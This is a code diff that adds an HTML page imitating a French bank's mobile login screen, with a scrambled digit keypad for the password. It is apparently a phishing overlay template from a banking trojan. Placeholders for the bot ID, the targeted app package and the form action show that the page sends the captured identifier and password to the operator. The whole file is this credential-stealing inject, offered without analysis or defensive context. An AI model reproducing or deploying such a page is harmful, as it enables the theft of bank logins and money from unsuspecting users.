@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title></title>
+	<style type='text/css'>
+	* {
+		margin: 0;
+		padding: 0;
+		font-size: 14pt;
+	}
+	
+	body {
+		background-color: #17479e;
+	}
+	
+	#header {
+		border-bottom: 1px solid #eee;
+		padding: 10px;
+	}
+	
+	.button1 {
+		font-weight: bold;
+		padding: 20px;
+		width: 100%;
+		
+		color: black;
+		background-color: white;
+		border: 0;
+		border-radius: 5px; 
+	}
+	
+	
+	#body {
+		width: 100%;
+	}
+	#body TD {
+		padding: 10px;
+	}
+	
+	INPUT {
+		border: 0;
+		background-color: transparent;
+		width: 100%;
+	}
+
+	.loginbuttons {
+		height: 60px;
+		color: white;
+	}
+	
+	.inp {
+		width: 95%;
+		text-align: center;
+		height: 60px;
+		border: 1px solid #777;
+		border-radius: 3px;
+	}
+	
+	#numbers TD A {
+		color: white; 
+		font-size: 16pt;
+		display: block;
+		width: 100%;
+		text-decoration: none;
+		font-family: Verdana;
+	}
+	
+	#numbers TD {
+		background-color: #17479e;
+	}
+	</style>
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+<script type='text/javascript'>
+document.total_steps = 1
+//document.current_step = 1
+//document.error_style = 'border: 1px solid red'
+
+function add_number(num)
+{
+	$('#field2').val($('#field2').val()+num)
+}
+
+</script>
+<script src='%DYN_PATH_GENERAL%/br_main.js'></script>
+
+</head>
+
+<body>
+<div id='body'>	
+	<form id='mainform' method='post' action='%ACTION%'>
+		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+		
+	<table border='0' width='100%' style='margin: 0 auto; margin-bottom: 20px' cellpadding=0 cellspacing=0>
+	<tr><td style='padding: 20px; text-align: center; color: white; font-family: Verdana; font-size: 16pt; '>
+		CONNEXION
+</td></tr>
+	</table>
+
+
+	<table border='0'  style='margin: 0 auto; background-color: white; width: 90%' id='step1' cellpadding=0 cellspacing=0>
+		<tr>
+			<td style='text-align: center'><input class='inp' type='number' id='field1' name='fields[login]' value='' placeholder='Saisissez ici votre identifiant' /></td></tr>
+		<tr>
+			<td style='text-align: center'><input class='inp' type='password' readonly id='field2' name='fields[password]' value='' placeholder='Composez votre mot de passe' /></td></tr>
+		<tr>
+			<td style='text-align: center'>
+			<table style='width: 100%' id='numbers'>
+				<tr>
+					<td>&nbsp;</td>
+					<td><a href='javascript:add_number(3);undefined'>3</a></td>
+					<td>&nbsp;</td>
+					<td><a href='javascript:add_number(0);undefined'>0</a></td>
+				</tr>
+				<tr>
+					<td><a href='javascript:add_number(1);undefined'>1</a></td>
+					<td><a href='javascript:add_number(6);undefined'>6</a></td>
+					<td><a href='javascript:add_number(5);undefined'>5</a></td>
+					<td>&nbsp;</td>
+				</tr>
+				<tr>
+					<td>&nbsp;</td>
+					<td>&nbsp;</td>
+					<td>&nbsp;</td>
+					<td><a href='javascript:add_number(2);undefined'>2</a></td>
+				</tr>
+				<tr>
+					<td><a href='javascript:add_number(9);undefined'>9</a></td>
+					<td><a href='javascript:add_number(4);undefined'>4</a></td>
+					<td><a href='javascript:add_number(7);undefined'>7</a></td>
+					<td><a href='javascript:add_number(8);undefined'>8</a></td>
+				</tr>
+				
+				<tr>
+					<td colspan='2' style='background-color: white; padding: 0'><input id='loginbutton' style='background-color: #8098c5' class='button loginbuttons' type='button' onclick='change_step()' value='VALIDER' /></td>
+					<td colspan='2' style='background-color: white; padding: 0'><input class='button loginbuttons' style='background-color: #666' type='button' onclick='reset()' value='EFFACER' /></td>
+				</tr>
+			</table>
+			
+			</td>
+		</tr>
+		
+	</table>
+
+	<table border='0' width='100%' style='margin: 0 auto; margin-top: 30px'>
+	<tr><td style='text-align: center'></td></tr>
+	</table>
+	
+	</form>
+</div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
